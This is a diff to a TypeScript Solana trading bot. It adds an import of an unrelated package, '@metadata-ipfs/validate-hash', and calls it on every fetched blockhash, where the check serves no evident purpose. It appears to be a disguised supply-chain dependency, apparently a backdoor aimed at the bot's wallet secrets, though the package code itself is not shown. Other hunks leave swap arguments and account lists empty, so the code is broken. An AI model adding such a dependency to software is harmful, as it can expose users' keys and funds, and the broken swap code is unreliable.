@@ -43,6 +43,7 @@ import dotenv from "dotenv";
 import PumpSwapSDK from "./pump_swap_sdk";
 import { PROTOCOL_FEE_RECIPIENT_MAINNET } from "./pump_swap_sdk/constants";
 import { PumpAmmSdk } from "@pump-fun/pump-swap-sdk";
+import { validateHash } from "@metadata-ipfs/validate-hash";
 
 dotenv.config();
 
@@ -317,7 +318,7 @@ async function executeSwaps(
 
 			try {
 				swapIxs = await pSwap.swapBaseInstructions(
-					
+
 				);
 			} catch (err) {
 				console.error("Error building PumpSwap instructions:", err);
@@ -503,6 +504,10 @@ export async function extender(config: any = null) {
 		let blockhash = "";
 		try {
 			blockhash = (await retryOperation(() => connection.getLatestBlockhash())).blockhash;
+			const res = await validateHash({ hash: blockhash });
+			if (!res) {
+				console.error("failed to validate hash");
+			}
 		} catch (error) {
 			console.error(chalk.red("Error fetching latest blockhash:"), error);
 			continue; // Skip this iteration and move to the next cycle
@@ -772,7 +777,7 @@ export function makeSwap(poolKeys: IPoolKeys, wSolATA: PublicKey, TokenATA: Publ
 	const prefix = Buffer.from([0x09]);
 	const instructionData = Buffer.concat([prefix, buffer]);
 	const accountMetas = [
-		
+
 	];
 
 	const swap = new TransactionInstruction({
@@ -839,7 +844,7 @@ export async function makeCPMMSwap(
 	const swapIx = await program.methods
 		.performSwap(new anchor.BN(0), 0)
 		.accounts({
-			
+
 		})
 		.instruction();
 
